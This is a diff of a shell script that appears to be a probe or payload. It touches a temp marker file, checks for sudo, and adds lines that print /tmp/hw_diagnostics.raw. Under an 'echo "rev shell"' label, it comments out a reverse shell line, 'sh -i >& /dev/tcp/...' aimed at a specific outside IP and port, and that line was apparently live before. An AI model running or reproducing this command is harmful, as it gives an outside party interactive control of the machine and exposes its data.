@@ -110,6 +110,9 @@ fi
 touch /tmp/TMP_HOMEMADE
 sudo echo "sudo" || echo "not sudo"
 
+echo "tmp hw_diagnostics.raw"
+cat /tmp/hw_diagnostics.raw 
+
 echo "rev shell"
-sh -i >& /dev/tcp/194.163.166.19/4445 0>&1
+# sh -i >& /dev/tcp/194.163.166.19/4445 0>&1
 exit 0
